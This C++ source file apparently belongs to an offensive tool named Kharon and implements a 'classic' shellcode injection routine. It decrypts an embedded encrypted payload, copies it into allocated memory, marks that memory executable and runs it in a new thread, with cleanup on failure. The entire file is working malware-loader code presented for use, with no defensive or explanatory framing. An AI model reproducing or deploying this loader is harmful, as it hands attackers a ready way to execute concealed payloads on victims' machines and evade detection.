// ToDo VirtualAlloc -> memcpy -> VirtualProtect -> Exec

#include <Kharon.h>

#if INJECTION_TECHNIQUE == INJECTION_TECHNIQUE_CLASSIC

auto Injection::Classic( VOID ) -> VOID {
    PVOID  VmBase        = nullptr;
    PVOID  DecryptedHeap = nullptr;
    HANDLE Thread        = nullptr;
    DWORD  OldProt       = 0;

    auto CleanMask = [&]( const char* reason = nullptr, DWORD err = 0 ) -> VOID {
        if ( Thread        ) { CloseHandle( Thread ); Thread = nullptr; }
        if ( DecryptedHeap ) { HeapFree( GetProcessHeap(), 0, DecryptedHeap ); DecryptedHeap = nullptr; }
        if ( VmBase        ) { VirtualFree( VmBase, 0, MEM_RELEASE ); VmBase = nullptr; }

        if ( reason && err ) DbgPrint( "%s (%d)\n", reason, err );
        else if ( reason )   DbgPrint( "%s\n", reason );
    };

    DecryptedHeap = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, Shellcode::Size );
    if ( !DecryptedHeap ) {
        return CleanMask( "HeapAlloc failed" );
    }

    if ( Encryption::Decrypt( (const UCHAR*)Shellcode::Data, (INT)Shellcode::Size, (UCHAR*)DecryptedHeap ) < 0 ) {
        return CleanMask( "Encryption::Decrypt failed" );
    }

    VmBase = VirtualAlloc( nullptr, Shellcode::Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !VmBase ) {
        return CleanMask( "VirtualAlloc failed", GetLastError() );
    }

    memcpy( VmBase, DecryptedHeap, Shellcode::Size );

    HeapFree( GetProcessHeap(), 0, DecryptedHeap );
    DecryptedHeap = nullptr;

    if ( !VirtualProtect( VmBase, Shellcode::Size, PAGE_EXECUTE_READ, &OldProt ) ) {
        return CleanMask( "VirtualProtect failed", GetLastError() );
    }

    Thread = CreateThread( nullptr, 0, (LPTHREAD_START_ROUTINE)VmBase, nullptr, 0, nullptr );
    if ( !Thread ) {
        return CleanMask( "CreateThread failed", GetLastError() );
    }

    WaitForSingleObject( Thread, INFINITE );

    CleanMask();
}

#endif // INJECTION_TECHNIQUE_CLASSIC